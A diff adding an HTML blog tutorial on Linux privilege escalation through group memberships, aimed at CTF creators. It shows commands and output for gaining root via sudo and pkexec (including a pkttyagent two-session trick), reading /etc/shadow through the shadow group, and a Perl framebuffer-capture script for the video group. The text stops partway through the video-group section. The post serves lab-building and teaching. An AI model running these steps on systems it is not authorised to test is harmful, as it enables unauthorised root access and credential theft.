@@ -1,0 +1,1419 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Linux Privilege Escalation - Groups for CTF Creators - pwnlog</title><meta name="Description" content="IT Security"><meta property="og:url" content="//localhost:1313/linux-privesc-groups/">
+  <meta property="og:site_name" content="pwnlog">
+  <meta property="og:title" content="Linux Privilege Escalation - Groups for CTF Creators">
+  <meta property="og:description" content="Groups can be dangerous &lt;*-*&lt;">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2021-12-28T11:33:00+08:00">
+    <meta property="article:modified_time" content="2021-12-28T11:33:00+08:00">
+    <meta property="article:tag" content="Privilege Escalation">
+    <meta property="article:tag" content="Groups">
+    <meta property="article:tag" content="Docker Group">
+    <meta property="article:tag" content="Lxd Group">
+    <meta property="article:tag" content="Sudo Group">
+    <meta property="article:tag" content="Video Group">
+    <meta property="og:image" content="//localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="//localhost:1313/logo.png">
+  <meta name="twitter:title" content="Linux Privilege Escalation - Groups for CTF Creators">
+  <meta name="twitter:description" content="Groups can be dangerous &lt;*-*&lt;">
+<meta name="application-name" content="pwnlog">
+<meta name="apple-mobile-web-app-title" content="pwnlog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="//localhost:1313/linux-privesc-groups/" /><link rel="prev" href="//localhost:1313/linux-privesc-nfs-root-squashing/" /><link rel="next" href="//localhost:1313/linux-privesc-cron-jobs/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Linux Privilege Escalation - Groups for CTF Creators",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/\/localhost:1313\/linux-privesc-groups\/"
+        },"image": ["\/\/localhost:1313\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "privilege escalation, groups, docker group, lxd group, sudo group, video group, disk group, shadow group, pkexec, wheel group, defend","wordcount":  2661 ,
+        "url": "\/\/localhost:1313\/linux-privesc-groups\/","datePublished": "2021-12-28T11:33:00+08:00","dateModified": "2021-12-28T11:33:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "\/\/localhost:1313\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "pwnlog"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> ~/ </a><a class="menu-item" href="/posts/"> ~/posts </a><a class="menu-item" href="/tags/"> ~/tags </a><a class="menu-item" href="/categories/"> ~/categories </a><a class="menu-item" href="/about/"> ~/about </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/" title="">~/</a><a class="menu-item" href="/posts/" title="">~/posts</a><a class="menu-item" href="/tags/" title="">~/tags</a><a class="menu-item" href="/categories/" title="">~/categories</a><a class="menu-item" href="/about/" title="">~/about</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Linux Privilege Escalation - Groups for CTF Creators</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>pwnlog</a></span>&nbsp;<span class="post-category">included in <a href="/categories/linux-privilege-escalation/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Linux Privilege Escalation</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-12-28">2021-12-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2661 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;13 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#groups">Groups</a></li>
+    <li><a href="#privilege-escalation-via-sudo-group">Privilege Escalation via Sudo Group</a></li>
+    <li><a href="#privilege-escalation-via-pkexec-group">Privilege Escalation via Pkexec Group</a>
+      <ul>
+        <li><a href="#gui">GUI</a></li>
+        <li><a href="#terminal">Terminal</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation-via-shadow-group">Privilege Escalation via Shadow Group</a></li>
+    <li><a href="#privilege-escalation-via-video-group">Privilege Escalation via Video Group</a></li>
+    <li><a href="#privilege-escalation-via-disk">Privilege Escalation via Disk</a></li>
+    <li><a href="#privilege-escalation-via-root-group">Privilege Escalation via Root Group</a></li>
+    <li><a href="#privilege-escalation-via-adm-group">Privilege Escalation via Adm Group</a></li>
+    <li><a href="#privilege-escalation-via-docker-group">Privilege Escalation via Docker Group</a></li>
+    <li><a href="#privilege-escalation-via-lxd-group">Privilege Escalation via LXD Group</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="groups">Groups</h1>
+<p>Groups are a collection of user. However, if these groups are misconfigured by hacing wrong access control lists (ACLs), they can be abused to elevate privileges. Also in UNIX there are some specific groups that have a few capabilities that can be abused as well.</p>
+<h1 id="privilege-escalation-via-sudo-group">Privilege Escalation via Sudo Group</h1>
+<p>We&rsquo;ll add the current user to the sudo group and reboot the system to apply the changes:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo usermod -aG sudo user <span class="o">&amp;&amp;</span> reboot
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The following configuration is very common on sudo:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># Allow members of group sudo to execute any command</span>
+</span></span><span class="line"><span class="cl">%sudo	<span class="nv">ALL</span><span class="o">=(</span>ALL:ALL<span class="o">)</span> ALL
+</span></span><span class="line"><span class="cl"><span class="c1"># Allow members of group admin to execute any command</span>
+</span></span><span class="line"><span class="cl">%admin 	<span class="nv">ALL</span><span class="o">=(</span>ALL:ALL<span class="o">)</span> ALL
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The code above means that any user that belongs to the group sudo or admin can execute anything as sudo.</p>
+<p>If this is the case, we can just switch to the root user as long as we have the current user&rsquo;s password:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo su
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can remove the current user from the sudo or the admin group but I&rsquo;m not gonna do it:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo gpasswd -d user sudo
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Reboot the system to apply the change:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">reboot
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-pkexec-group">Privilege Escalation via Pkexec Group</h1>
+<p>Find the <code>Pkexec</code> binary and read its configuration:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ find / -perm -4000 2&gt;/dev/null <span class="p">|</span> grep pkexec
+</span></span><span class="line"><span class="cl">/usr/bin/pkexec
+</span></span><span class="line"><span class="cl">user@pwn:~$ cat /etc/polkit-1/localauthority.conf.d/*
+</span></span><span class="line"><span class="cl"><span class="c1"># Configuration file for the PolicyKit Local Authority.</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># DO NOT EDIT THIS FILE, it will be overwritten on update.</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># See the pklocalauthority(8) man page for more information</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># about configuring the Local Authority.</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Configuration<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">AdminIdentities</span><span class="o">=</span>unix-user:0
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Configuration<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">AdminIdentities</span><span class="o">=</span>unix-group:sudo<span class="p">;</span>unix-group:admin
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="gui">GUI</h2>
+<p>Spawn <code>bash</code> as root using <code>pkexec</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ pkexec <span class="s2">&#34;/usr/bin/bash&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>When using the GUI, we will get a popup window. In this window we&rsquo;ll type the password of our current user:</p>
+<figure><a class="lightgallery" href="/images/posts/pkexec-gui.png" title="/images/posts/pkexec-gui.png" data-thumbnail="/images/posts/pkexec-gui.png" data-sub-html="<h2>Pkexec GUI</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/pkexec-gui.png"
+            data-srcset="/images/posts/pkexec-gui.png, /images/posts/pkexec-gui.png 1.5x, /images/posts/pkexec-gui.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/pkexec-gui.png" />
+    </a><figcaption class="image-caption">Pkexec GUI</figcaption>
+    </figure>
+<p>Verify that we&rsquo;re the root user:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># id</span>
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># exit</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="terminal">Terminal</h2>
+<p>We need two different remote sessions. In the first shell do the following.</p>
+<p>Get the current process PID:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ <span class="nb">echo</span> <span class="nv">$$</span>
+</span></span><span class="line"><span class="cl"><span class="m">20246</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In the second SSH session execute this command to attach to the first SSH session using its PID:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ pkttyagent --process <span class="nv">20246</span>
+</span></span><span class="line"><span class="cl"><span class="o">====</span> AUTHENTICATING FOR org.freedesktop.policykit.exec <span class="o">===</span>
+</span></span><span class="line"><span class="cl">Authentication is needed to run <span class="sb">`</span>/bin/bash<span class="err">&#39;</span> as the super user
+</span></span><span class="line"><span class="cl">Authenticating as: user,,, <span class="o">(</span>user<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Password: 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In the first SSH session, we&rsquo;ll execute pkexec</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pkexec <span class="s2">&#34;/bin/bash&#34;</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In the second SSH session, we will be asked to authenticate to <code>Pkexec</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ pkttyagent --process <span class="nv">20246</span>
+</span></span><span class="line"><span class="cl"><span class="o">====</span> AUTHENTICATING FOR org.freedesktop.policykit.exec <span class="o">===</span>
+</span></span><span class="line"><span class="cl">Authentication is needed to run <span class="sb">`</span>/bin/bash<span class="err">&#39;</span> as the super user
+</span></span><span class="line"><span class="cl">Authenticating as: user,,, <span class="o">(</span>user<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl"><span class="o">====</span> AUTHENTICATION <span class="nv">COMPLETE</span> <span class="o">===</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>When the authentication is complete, we&rsquo;ll go to the first SSH session and we will see a root shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ pkexec <span class="s2">&#34;/bin/bash&#34;</span> 
+</span></span><span class="line"><span class="cl">root@pwn:~# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@pwn:~# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">root@pwn:~# 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Remove the current user from the pkexec group:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo gpasswd -d user pkexec
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Reboot the system to apply the changes:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">reboot
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-shadow-group">Privilege Escalation via Shadow Group</h1>
+<p>The shadow group can read and modify the <code>/etc/shadow</code> file. We&rsquo;ll add the current user to the shadow group:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo usermod -aG shadow user <span class="o">&amp;&amp;</span> reboot
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Users from the group shadow can read the <code>/etc/shadow</code> file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">-rw-r----- <span class="m">1</span> root shadow <span class="m">1824</span> May <span class="m">11</span> 10:14 /etc/shadow
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Remove the current user from the shadow group:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo gpasswd -d user shadow
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Reboot the system to apply the change:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">reboot
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-video-group">Privilege Escalation via Video Group</h1>
+<p>The video group can manage video devices.</p>
+<p>Add the current user to the video group:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo usermod -aG video user <span class="o">&amp;&amp;</span> reboot
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Install the required packages:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo apt install gimp rawtherapee pnmtopng
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can use this Perl script:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/perl</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">strict</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nn">warnings</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$w</span> <span class="o">=</span> <span class="nb">shift</span> <span class="o">||</span> <span class="mi">240</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$h</span> <span class="o">=</span> <span class="nb">shift</span> <span class="o">||</span> <span class="mi">320</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">my</span> <span class="nv">$pixels</span> <span class="o">=</span> <span class="nv">$w</span> <span class="o">*</span> <span class="nv">$h</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">open</span><span class="p">(</span><span class="k">my</span> <span class="nv">$out</span><span class="p">,</span> <span class="s">&#34;|-&#34;</span><span class="p">,</span> <span class="s">&#34;pnmtopng&#34;</span><span class="p">)</span> <span class="ow">or</span> <span class="nb">die</span> <span class="s">&#34;Can&#39;t pipe pnmtopng: $!\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">printf</span> <span class="nv">$out</span> <span class="s">&#34;P6%d %d\n255\n&#34;</span><span class="p">,</span> <span class="nv">$w</span><span class="p">,</span> <span class="nv">$h</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="nb">read</span><span class="p">(</span><span class="bp">STDIN</span><span class="p">,</span> <span class="k">my</span> <span class="nv">$raw</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="ow">and</span> <span class="nv">$pixels</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">my</span> <span class="nv">$short</span> <span class="o">=</span> <span class="nb">unpack</span><span class="p">(</span><span class="s">&#39;S&#39;</span><span class="p">,</span> <span class="nv">$raw</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">print</span> <span class="nv">$out</span> <span class="nb">pack</span><span class="p">(</span><span class="s">&#34;C3&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="nv">$short</span> <span class="o">&amp;</span> <span class="mh">0xf800</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="nv">$short</span> <span class="o">&amp;</span> <span class="mh">0x7e0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="nv">$short</span> <span class="o">&amp;</span> <span class="mh">0x1f</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">close</span> <span class="nv">$out</span> <span class="ow">or</span> <span class="nb">die</span> <span class="s">&#34;Error closing pnmtopng: $!\n&#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The Perl script above reads binary input from STDIN, converts it to a PNG image using <code>pnmtopng</code>, and outputs the resulting image.</p>
+<p>Add execution permissions to the script:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">chmod +x iraw2png.pl 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Create a screenshot for fb0 by changing the TTY <code>Ctrl+Alt+F3</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#39;The password of the root user is: pass123&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using the command w we can find who is logged on the system and it will show an output like the focusing one:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~/Desktop$ w
+</span></span></code></pre></td></tr></table>
+</div>
